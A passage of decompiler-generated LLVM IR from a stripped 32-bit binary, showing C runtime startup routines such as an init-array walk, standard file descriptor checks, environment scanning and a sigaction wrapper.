dec_label_pc_8052d87:                             ; preds = %dec_label_pc_8052d3b, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c92
  br label %dec_label_pc_8052db4

dec_label_pc_8052d8c:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d93:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d9a:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052da1:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052da8:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052daf:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052db4:                             ; preds = %dec_label_pc_8052da8, %dec_label_pc_8052da1, %dec_label_pc_8052d9a, %dec_label_pc_8052d93, %dec_label_pc_8052d8c, %dec_label_pc_8052d80, %dec_label_pc_8052d79, %dec_label_pc_8052d72, %dec_label_pc_8052d6b, %dec_label_pc_8052d64, %dec_label_pc_8052d56, %dec_label_pc_8052d4f, %dec_label_pc_8052d87, %dec_label_pc_8052d5d, %dec_label_pc_8052d34, %dec_label_pc_8052d2a, %dec_label_pc_8052d20, %dec_label_pc_8052d16, %dec_label_pc_8052d0c, %dec_label_pc_8052d02, %dec_label_pc_8052cf8, %dec_label_pc_8052cee, %dec_label_pc_8052ce4, %dec_label_pc_8052cda, %dec_label_pc_8052cc8, %dec_label_pc_8052cb6, %dec_label_pc_8052cac, %dec_label_pc_8052ca2, %dec_label_pc_8052c88, %dec_label_pc_8052daf
  %v0_8052db7 = phi i32 [ 255, %dec_label_pc_8052da8 ], [ 2048, %dec_label_pc_8052da1 ], [ 99, %dec_label_pc_8052d9a ], [ 20, %dec_label_pc_8052d93 ], [ -128, %dec_label_pc_8052d8c ], [ 1024, %dec_label_pc_8052d80 ], [ 4, %dec_label_pc_8052d79 ], [ 32, %dec_label_pc_8052d72 ], [ 256, %dec_label_pc_8052d6b ], [ 2147483647, %dec_label_pc_8052d64 ], [ 16, %dec_label_pc_8052d56 ], [ 127, %dec_label_pc_8052d4f ], [ -1, %dec_label_pc_8052d87 ], [ 200112, %dec_label_pc_8052d5d ], [ 9, %dec_label_pc_8052d34 ], [ 65535, %dec_label_pc_8052d2a ], [ -32768, %dec_label_pc_8052d20 ], [ -2147483648, %dec_label_pc_8052d16 ], [ 8, %dec_label_pc_8052d0c ], [ 500, %dec_label_pc_8052d02 ], [ 4096, %dec_label_pc_8052cf8 ], [ 16384, %dec_label_pc_8052cee ], [ 1000, %dec_label_pc_8052ce4 ], [ 32768, %dec_label_pc_8052cda ], [ 6, %dec_label_pc_8052cc8 ], [ 65536, %dec_label_pc_8052cb6 ], [ 100, %dec_label_pc_8052cac ], [ 131072, %dec_label_pc_8052ca2 ], [ 1, %dec_label_pc_8052c88 ], [ 32767, %dec_label_pc_8052daf ]
  ret i32 %v0_8052db7

; uselistorder directives
  uselistorder i32 65536, { 28, 29, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 14, 13, 16, 17, 15, 18, 1, 19, 0, 2, 22, 20, 23, 21, 26, 24, 25, 27 }
  uselistorder i32 16384, { 0, 3, 4, 5, 6, 7, 8, 9, 22, 23, 20, 21, 18, 19, 1, 2, 12, 13, 10, 11, 14, 15, 16, 17, 24, 25, 26, 27 }
  uselistorder i32 65535, { 2, 0, 1 }
  uselistorder i32 2048, { 2, 1, 0 }
  uselistorder i32 255, { 0, 2, 3, 4, 1 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 104, { 2, 3, 0, 1 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 63, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 60, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 50, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 42, { 0, 2, 1, 3, 4 }
  uselistorder i32 37, { 1, 0, 2, 3, 4 }
  uselistorder i32 34, { 2, 0, 1, 3, 4, 5, 6 }
  uselistorder i32 27, { 2, 3, 4, 5, 6, 7, 1, 0 }
  uselistorder i32 17, { 1, 0 }
  uselistorder i32 13, { 0, 2, 3, 1 }
  uselistorder i32 9, { 2, 4, 0, 1, 3, 6, 11, 7, 8, 9, 10, 5, 12 }
  uselistorder i32 6, { 0, 5, 2, 3, 1, 7, 4, 11, 8, 9, 10, 6 }
  uselistorder i32 5, { 3, 0, 5, 6, 8, 9, 10, 7, 4, 2, 1 }
  uselistorder label %dec_label_pc_8052db4, { 29, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 13, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder label %dec_label_pc_8052d87, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8052d5d, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8052cda, { 1, 0 }
  uselistorder label %dec_label_pc_8052cc8, { 1, 0 }
}

define i32 @function_8052db8() local_unnamed_addr {
dec_label_pc_8052db8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052db8 = load i32, i32* @ebx, align 4
  store i32 %v0_8052db8, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32 -134565892), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32 -134565892), i32 2), i32 0), label %dec_label_pc_8052dcc, label %dec_label_pc_8052dd9

dec_label_pc_8052dcc:                             ; preds = %dec_label_pc_8052db8, %dec_label_pc_8052dcc
  %v1_8052dd36 = phi i32 [ %v1_8052dd3, %dec_label_pc_8052dcc ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32 -134565892), i32 2), i32 -1), %dec_label_pc_8052db8 ]
  store i32 ptrtoint (i32* @global_var_8052dd3.58 to i32), i32* %stack_var_-16, align 4
  %v5_8052dcc = mul i32 %v1_8052dd36, 4
  %v6_8052dcc = add i32 %v5_8052dcc, ptrtoint (i32* @global_var_8055004.57 to i32)
  %v7_8052dcc = inttoptr i32 %v6_8052dcc to i32*
  %v8_8052dcc = load i32, i32* %v7_8052dcc, align 4
  call void @__pseudo_call(i32 %v8_8052dcc)
  %v0_8052dd3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052dd3 = add i32 %v0_8052dd3.pre, -1
  store i32 %v1_8052dd3, i32* %ebx.global-to-local, align 4
  %v10_8052dd4 = icmp eq i32 %v0_8052dd3.pre, 0
  %v1_8052dd7 = icmp eq i1 %v10_8052dd4, false
  br i1 %v1_8052dd7, label %dec_label_pc_8052dcc, label %dec_label_pc_8052dd9

dec_label_pc_8052dd9:                             ; preds = %dec_label_pc_8052dcc, %dec_label_pc_8052db8
  %v0_8052dd9 = load i32, i32* @global_var_8055148.59, align 8
  %v1_8052dde = icmp eq i32 %v0_8052dd9, 0
  br i1 %v1_8052dde, label %dec_label_pc_8052de4, label %dec_label_pc_8052de2

dec_label_pc_8052de2:                             ; preds = %dec_label_pc_8052dd9
  %v0_8052de2 = load i32, i32* %stack_var_-16, align 4
  %v1_8052de2 = call i32 @unknown_0(i32 %v0_8052de2)
  br label %dec_label_pc_8052de4

dec_label_pc_8052de4:                             ; preds = %dec_label_pc_8052de2, %dec_label_pc_8052dd9
  %v0_8052de4 = load i32, i32* @global_var_805514c.60, align 4
  %v1_8052dea = icmp eq i32 %v0_8052de4, 0
  br i1 %v1_8052dea, label %dec_label_pc_8052df3, label %dec_label_pc_8052dee

dec_label_pc_8052dee:                             ; preds = %dec_label_pc_8052de4
  %v2_8052df0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052df0, i32* %ebx.global-to-local, align 4
  %v0_8052df1 = load i32, i32* %stack_var_-16, align 4
  %v1_8052df1 = call i32 @unknown_0(i32 %v0_8052df1)
  br label %dec_label_pc_8052df3

dec_label_pc_8052df3:                             ; preds = %dec_label_pc_8052de4, %dec_label_pc_8052dee
  %v2_8052df3 = load i32, i32* %stack_var_-16, align 4
  ret i32 %v2_8052df3

; uselistorder directives
  uselistorder i32 %v1_8052dd3, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8052df3, { 1, 0 }
  uselistorder label %dec_label_pc_8052dcc, { 1, 0 }
}

define i32 @function_8052df7(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052df7:
  ret i32 0
}

define i32 @function_8052dfa(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052dfa:
  %v0_8052dfa = load i32, i32* @eax, align 4
  ret i32 %v0_8052dfa
}

define i32 @function_8052dfb() local_unnamed_addr {
dec_label_pc_8052dfb:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8052dfb = load i32, i32* @esi, align 4
  %v0_8052dfc = load i32, i32* @ebx, align 4
  %v0_8052e00 = load i32, i32* @eax, align 4
  store i32 %v0_8052e00, i32* @esi, align 4
  %v0_8052e02 = load i32, i32* @edx, align 4
  store i32 %v0_8052e02, i32* @ebx, align 4
  %v4_8052e07 = call i32 @function_8050ecd(i32 %v0_8052e00, i32 1, i32 %tmp6)
  %v8_8052e0f = icmp eq i32 %v4_8052e07, -1
  %v1_8052e10 = icmp eq i1 %v8_8052e0f, false
  br i1 %v1_8052e10, label %dec_label_pc_8052e2b, label %dec_label_pc_8052e12

dec_label_pc_8052e12:                             ; preds = %dec_label_pc_8052dfb
  %v0_8052e14 = load i32, i32* @ebx, align 4
  %v6_8052e1a = call i32 @function_8051074(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053ce8.61, i32 0, i32 0), i32 %v0_8052e14)
  %v1_8052e22 = load i32, i32* @esi, align 4
  %v12_8052e22 = icmp eq i32 %v6_8052e1a, %v1_8052e22
  br i1 %v12_8052e22, label %dec_label_pc_8052e2b, label %dec_label_pc_8052e26

dec_label_pc_8052e26:                             ; preds = %dec_label_pc_8052e12
  %v0_8052e26 = call i32 @function_805282f()
  br label %dec_label_pc_8052e2b

dec_label_pc_8052e2b:                             ; preds = %dec_label_pc_8052e12, %dec_label_pc_8052dfb, %dec_label_pc_8052e26
  %v2_8052e2b = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8052dfc, i32* @ebx, align 4
  store i32 %v0_8052dfb, i32* @esi, align 4
  ret i32 %v2_8052e2b

; uselistorder directives
  uselistorder i32 ()* @function_805282f, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_8051074, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8050ecd, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052e2b, { 2, 0, 1 }
}

define i32 @function_8052e2f() local_unnamed_addr {
dec_label_pc_8052e2f:
  %v0_8052e32 = load i8, i8* @global_var_8055150.62, align 16
  %v1_8052e32 = icmp eq i8 %v0_8052e32, 0
  %v1_8052e39 = icmp eq i1 %v1_8052e32, false
  br i1 %v1_8052e39, label %dec_label_pc_8052e2f.dec_label_pc_8052e6b_crit_edge, label %dec_label_pc_8052e3b

dec_label_pc_8052e2f.dec_label_pc_8052e6b_crit_edge: ; preds = %dec_label_pc_8052e2f
  %v0_8052e6e.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8052e6b

dec_label_pc_8052e3b:                             ; preds = %dec_label_pc_8052e2f
  store i8 1, i8* @global_var_8055150.62, align 16
  store i32 4096, i32* @global_var_8055144.63, align 4
  br label %dec_label_pc_8052e6b

dec_label_pc_8052e6b:                             ; preds = %dec_label_pc_8052e2f.dec_label_pc_8052e6b_crit_edge, %dec_label_pc_8052e3b
  %v0_8052e6e = phi i32 [ %v0_8052e6e.pre, %dec_label_pc_8052e2f.dec_label_pc_8052e6b_crit_edge ], [ 0, %dec_label_pc_8052e3b ]
  ret i32 %v0_8052e6e

; uselistorder directives
  uselistorder i8 1, { 8, 5, 7, 0, 1, 2, 3, 4, 6 }
  uselistorder i8* @global_var_8055150.62, { 1, 0 }
  uselistorder label %dec_label_pc_8052e6b, { 1, 0 }
}

define i32 @function_8052e6f(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8052e6f:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_8052e6f = load i32, i32* @ebp, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805513c.64, align 4
  store i32 %arg6, i32* @global_var_805514c.60, align 4
  %v2_8052ea6 = mul i32 %arg2, 4
  %v3_8052ea6 = add i32 %tmp44, %v2_8052ea6
  %v1_8052ea9 = add i32 %v3_8052ea6, 4
  store i32 %v1_8052ea9, i32* @global_var_8055140.65, align 64
  %v3_8052eb1 = load i32, i32* %arg3, align 4
  %v14_8052eb1 = icmp eq i32 %v1_8052ea9, %v3_8052eb1
  %v1_8052eb3 = icmp eq i1 %v14_8052eb1, false
  %v1_8052ea9.v3_8052ea6 = select i1 %v1_8052eb3, i32 %v1_8052ea9, i32 %v3_8052ea6
  store i32 %v1_8052ea9.v3_8052ea6, i32* @global_var_8055140.65, align 64
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8052ec0 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8052ec5 = bitcast i32* %stack_var_-136 to i8*
  %v4_8052ec5 = call i32 @function_80514ec(i8* %v3_8052ec5, i32 0, i32 120)
  %v0_8052eca = load i32, i32* @global_var_8055140.65, align 64
  br label %dec_label_pc_8052ed2

dec_label_pc_8052ed2:                             ; preds = %dec_label_pc_8052ed2, %dec_label_pc_8052e6f
  %v0_8052ed2 = phi i32 [ %v1_8052ed5, %dec_label_pc_8052ed2 ], [ %v0_8052eca, %dec_label_pc_8052e6f ]
  %v1_8052ed2 = inttoptr i32 %v0_8052ed2 to i32*
  %v2_8052ed2 = load i32, i32* %v1_8052ed2, align 4
  %v3_8052ed2 = icmp eq i32 %v2_8052ed2, 0
  %v1_8052ed5 = add i32 %v0_8052ed2, 4
  %v1_8052ed8 = icmp eq i1 %v3_8052ed2, false
  br i1 %v1_8052ed8, label %dec_label_pc_8052ed2, label %dec_label_pc_8052ef9.preheader

dec_label_pc_8052ef9.preheader:                   ; preds = %dec_label_pc_8052ed2
  store i32 %v1_8052ed5, i32* @ebx, align 4
  %v1_8052ef922 = inttoptr i32 %v1_8052ed5 to i32*
  %v2_8052ef923 = load i32, i32* %v1_8052ef922, align 4
  %v3_8052ef924 = icmp eq i32 %v2_8052ef923, 0
  %v1_8052efc26 = icmp eq i1 %v3_8052ef924, false
  br i1 %v1_8052efc26, label %dec_label_pc_8052ede.lr.ph, label %dec_label_pc_8052efe

dec_label_pc_8052ede.lr.ph:                       ; preds = %dec_label_pc_8052ef9.preheader
  %v3_8052ebe = ptrtoint i32* %stack_var_-168 to i32
  %v3_8052ee9 = add i32 %v3_8052ebe, 32
  br label %dec_label_pc_8052ede

dec_label_pc_8052ede:                             ; preds = %dec_label_pc_8052ede.lr.ph, %dec_label_pc_8052ef6
  %v1_8052ee9 = phi i32 [ %v2_8052ef923, %dec_label_pc_8052ede.lr.ph ], [ %v2_8052ef9, %dec_label_pc_8052ef6 ]
  %v0_8052ee8 = phi i32 [ %v1_8052ed5, %dec_label_pc_8052ede.lr.ph ], [ %v1_8052ef6, %dec_label_pc_8052ef6 ]
  %v6_8052ee3 = icmp ugt i32 %v1_8052ee9, 14
  br i1 %v6_8052ee3, label %dec_label_pc_8052ef6, label %dec_label_pc_8052ee5

dec_label_pc_8052ee5:                             ; preds = %dec_label_pc_8052ede
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_8052ee8, i32* %stack_var_-168, align 4
  %v2_8052ee9 = mul i32 %v1_8052ee9, 8
  %v4_8052ee9 = add i32 %v3_8052ee9, %v2_8052ee9
  %v3_8052eee = inttoptr i32 %v4_8052ee9 to i16*
  %v4_8052eee = call i32 @function_80536ba(i16* %v3_8052eee, i32 %v0_8052ee8, i32 8)
  %v0_8052ef6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052ef6

dec_label_pc_8052ef6:                             ; preds = %dec_label_pc_8052ede, %dec_label_pc_8052ee5
  %v0_8052ef6 = phi i32 [ %v0_8052ee8, %dec_label_pc_8052ede ], [ %v0_8052ef6.pre, %dec_label_pc_8052ee5 ]
  %v1_8052ef6 = add i32 %v0_8052ef6, 8
  store i32 %v1_8052ef6, i32* @ebx, align 4
  %v1_8052ef9 = inttoptr i32 %v1_8052ef6 to i32*
  %v2_8052ef9 = load i32, i32* %v1_8052ef9, align 4
  %v3_8052ef9 = icmp eq i32 %v2_8052ef9, 0
  %v1_8052efc = icmp eq i1 %v3_8052ef9, false
  br i1 %v1_8052efc, label %dec_label_pc_8052ede, label %dec_label_pc_8052efe

dec_label_pc_8052efe:                             ; preds = %dec_label_pc_8052ef6, %dec_label_pc_8052ef9.preheader
  store i32 %v2_8052ec0, i32* @eax, align 4
  %v0_8052f02 = call i32 @function_805378d()
  store i32 %v0_8052f02, i32* @eax, align 4
  %v0_8052f07 = call i32 @function_8052e2f()
  %v1_8052f10 = icmp eq i32 %tmp39, 0
  %v1_8052f12 = icmp eq i1 %v1_8052f10, false
  %v1_8052f14 = and i32 %tmp39, -65536
  %v2_8052f14 = or i32 %v1_8052f14, 4096
  %storemerge = select i1 %v1_8052f12, i32 %tmp39, i32 %v2_8052f14
  store i32 %storemerge, i32* @global_var_8055144.63, align 4
  %v13_8052f1d = icmp eq i32 %tmp38, -1
  %v1_8052f22 = icmp eq i1 %v13_8052f1d, false
  br i1 %v1_8052f22, label %dec_label_pc_8052f4d, label %dec_label_pc_8052f24

dec_label_pc_8052f24:                             ; preds = %dec_label_pc_8052efe
  %v0_8052f24 = call i32 @function_8053499()
  store i32 %v0_8052f24, i32* @ebx, align 4
  %v0_8052f2b = call i32 @function_8053408()
  %v0_8052f30 = load i32, i32* @ebx, align 4
  %v12_8052f30 = icmp eq i32 %v0_8052f30, %v0_8052f2b
  %v1_8052f32 = icmp eq i1 %v12_8052f30, false
  br i1 %v1_8052f32, label %dec_label_pc_8052f63, label %dec_label_pc_8052f34

dec_label_pc_8052f34:                             ; preds = %dec_label_pc_8052f24
  %v0_8052f34 = call i32 @function_805342e()
  store i32 %v0_8052f34, i32* @ebx, align 4
  %v0_8052f3b = call i32 @function_80533e2()
  %v0_8052f40 = load i32, i32* @ebx, align 4
  %v12_8052f40 = icmp eq i32 %v0_8052f40, %v0_8052f3b
  %v1_8052f42 = icmp eq i1 %v12_8052f40, false
  br i1 %v1_8052f42, label %dec_label_pc_8052f63, label %dec_label_pc_8052f8d

dec_label_pc_8052f4d:                             ; preds = %dec_label_pc_8052efe
  br label %dec_label_pc_8052f63

dec_label_pc_8052f63:                             ; preds = %dec_label_pc_8052f4d, %dec_label_pc_8052f34, %dec_label_pc_8052f24
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8052f6a = call i32 @function_8052dfb()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8052f79 = call i32 @function_8052dfb()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8052f88 = call i32 @function_8052dfb()
  br label %dec_label_pc_8052f8d

dec_label_pc_8052f8d:                             ; preds = %dec_label_pc_8052f34, %dec_label_pc_8052f63
  store i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32* %esi.global-to-local, align 4
  %v0_8052f92 = load i32, i32* @edi, align 4
  %v1_8052f92 = inttoptr i32 %v0_8052f92 to i32*
  %v2_8052f92 = load i32, i32* %v1_8052f92, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32 -134565892), i32* %esi.global-to-local, align 4
  store i32 %v2_8052f92, i32* inttoptr (i32 134566020 to i32*), align 4
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32 -134565892), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8055148.59, align 8
  br i1 icmp ult (i32 add (i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32 -134565889), i32 7), label %dec_label_pc_8052fbe, label %dec_label_pc_8052fb2

dec_label_pc_8052fb2:                             ; preds = %dec_label_pc_8052f8d, %dec_label_pc_8052fb2
  %v4_8052fb2 = phi i32 [ %v1_8052fb9, %dec_label_pc_8052fb2 ], [ 0, %dec_label_pc_8052f8d ]
  %v5_8052fb2 = mul i32 %v4_8052fb2, 4
  %v6_8052fb2 = add i32 %v5_8052fb2, ptrtoint (i32* @global_var_8055004.57 to i32)
  %v7_8052fb2 = inttoptr i32 %v6_8052fb2 to i32*
  %v8_8052fb2 = load i32, i32* %v7_8052fb2, align 4
  call void @__pseudo_call(i32 %v8_8052fb2)
  %v0_8052fb9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052fb9 = add i32 %v0_8052fb9, 1
  store i32 %v1_8052fb9, i32* %ebx.global-to-local, align 4
  %v1_8052fba = load i32, i32* %esi.global-to-local, align 4
  %v7_8052fba = icmp ult i32 %v1_8052fb9, %v1_8052fba
  br i1 %v7_8052fba, label %dec_label_pc_8052fb2, label %dec_label_pc_8052fbe

dec_label_pc_8052fbe:                             ; preds = %dec_label_pc_8052fb2, %dec_label_pc_8052f8d
  store i32 134557636, i32* %stack_var_-164, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32 -134565892), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32 -134565892), i32 2), i32 0), label %dec_label_pc_8052fd6, label %dec_label_pc_8052fe2

dec_label_pc_8052fd6:                             ; preds = %dec_label_pc_8052fbe, %dec_label_pc_8052fd6
  %v4_8052fd6 = phi i32 [ %v1_8052fdd, %dec_label_pc_8052fd6 ], [ 0, %dec_label_pc_8052fbe ]
  store i32 ptrtoint (i32* @global_var_8052fdd.69 to i32), i32* %stack_var_-164, align 4
  %v5_8052fd6 = mul i32 %v4_8052fd6, 4
  %v6_8052fd6 = add i32 %v5_8052fd6, ptrtoint (i32* @global_var_8055004.57 to i32)
  %v7_8052fd6 = inttoptr i32 %v6_8052fd6 to i32*
  %v8_8052fd6 = load i32, i32* %v7_8052fd6, align 4
  call void @__pseudo_call(i32 %v8_8052fd6)
  %v0_8052fdd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052fdd = add i32 %v0_8052fdd, 1
  store i32 %v1_8052fdd, i32* %ebx.global-to-local, align 4
  %v1_8052fde = load i32, i32* %esi.global-to-local, align 4
  %v7_8052fde = icmp ult i32 %v1_8052fdd, %v1_8052fde
  br i1 %v7_8052fde, label %dec_label_pc_8052fd6, label %dec_label_pc_8052fe2

dec_label_pc_8052fe2:                             ; preds = %dec_label_pc_8052fd6, %dec_label_pc_8052fbe
  %v0_8052feb = load i32, i32* %stack_var_-164, align 4
  %v1_8052feb = call i32 @function_805149b(i32 %v0_8052feb)
  %v1_8052ff0 = inttoptr i32 %v1_8052feb to i32*
  store i32 0, i32* %v1_8052ff0, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-164, align 4
  %v0_805300b = load i32, i32* @global_var_8055140.65, align 64
  store i32 %v0_805300b, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8052e6f)
  %v0_8053020 = load i32, i32* @eax, align 4
  %v1_8053023 = call i32 @function_8052a83(i32 %v0_8053020)
  %v0_805302d = load i32, i32* @ebx, align 4
  %v1_805302d = inttoptr i32 %v0_805302d to %sigcontext*
  %v2_805302d = call i32 @sigreturn(%sigcontext* %v1_805302d)
  %v0_8053035 = load i32, i32* @ebx, align 4
  %v1_8053035 = inttoptr i32 %v0_8053035 to %sigcontext*
  %v2_8053035 = call i32 @sigreturn(%sigcontext* %v1_8053035)
  ret i32 %v2_8053035

; uselistorder directives
  uselistorder i32 %v1_8052fdd, { 1, 2, 0 }
  uselistorder i32 %v1_8052fb9, { 1, 2, 0 }
  uselistorder i32 %v2_8052ef9, { 1, 0 }
  uselistorder i32 %v1_8052ef6, { 2, 1, 0 }
  uselistorder i32 %v1_8052ed5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052ed2, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32 -134565892), i32 2), { 1, 3, 2, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8055004.57 to i32), i32 -134565892), { 0, 2, 1 }
  uselistorder i32 ()* @function_8052dfb, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 2, 0, 1 }
  uselistorder i32 120, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052fd6, { 1, 0 }
  uselistorder label %dec_label_pc_8052fb2, { 1, 0 }
  uselistorder label %dec_label_pc_8052f8d, { 1, 0 }
  uselistorder label %dec_label_pc_8052ef6, { 1, 0 }
  uselistorder label %dec_label_pc_8052ede, { 1, 0 }
}

define i32 @function_8053037(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053037:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8053037 = load i32, i32* @esi, align 4
  %v0_8053038 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805304d = icmp eq i32* %arg2, null
  br i1 %v1_805304d, label %dec_label_pc_8053037.dec_label_pc_80530a0_crit_edge, label %dec_label_pc_8053051

dec_label_pc_8053037.dec_label_pc_80530a0_crit_edge: ; preds = %dec_label_pc_8053037
  br label %dec_label_pc_80530a0

dec_label_pc_8053051:                             ; preds = %dec_label_pc_8053037
  %v2_8053051 = load i32, i32* %arg2, align 4
  store i32 %v2_8053051, i32* %stack_var_-148, align 4
  %v1_805305a = add i32 %tmp11, 4
  %v3_805306c = bitcast i32* %stack_var_-136 to i16*
  %v4_805306c = call i32 @function_80536ba(i16* %v3_805306c, i32 %v1_805305a, i32 128)
  br label %dec_label_pc_80530a0

dec_label_pc_80530a0:                             ; preds = %dec_label_pc_8053037.dec_label_pc_80530a0_crit_edge, %dec_label_pc_8053051
  %v1_80530a2 = icmp eq i32 %arg3, 0
  %v2_80530a6 = ptrtoint i32* %stack_var_-288 to i32
  %.v2_80530a6 = select i1 %v1_80530a2, i32 0, i32 %v2_80530a6
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  %v0_80530ba = select i1 %v1_805304d, %sigaction* null, %sigaction* %phitmp
  %v5_80530c2 = call i32 @function_805315d(i32 %arg1, %sigaction* %v0_80530ba, i32 %.v2_80530a6, i32 8)
  store i32 %v5_80530c2, i32* %ebx.global-to-local, align 4
  %v2_80530d0 = icmp slt i32 %v5_80530c2, 0
